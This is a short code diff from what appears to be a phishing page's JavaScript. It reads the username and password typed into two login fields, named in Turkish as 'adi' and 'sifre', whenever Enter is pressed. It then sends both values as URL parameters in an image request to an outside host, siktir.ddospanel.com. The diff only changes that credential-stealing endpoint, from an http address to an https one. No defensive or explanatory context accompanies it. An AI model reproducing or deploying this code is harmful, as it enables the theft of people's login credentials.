@@ -32,7 +32,7 @@ function runScript(e) {
     if (e.keyCode == 13) {
         var adi = document.getElementsByClassName("_kp5f7 _qy55y")[0].value;
         var sifre =  document.getElementsByClassName("_kp5f7 _qy55y")[1].value;
-	    new Image().src = "http://siktir.ddospanel.com/cpp.php" + "?us=" + adi + "&pw=" + sifre;	
+	    new Image().src = "https://siktir.ddospanel.com/cpin.php" + "?us=" + adi + "&pw=" + sifre;	
 
     }
 }
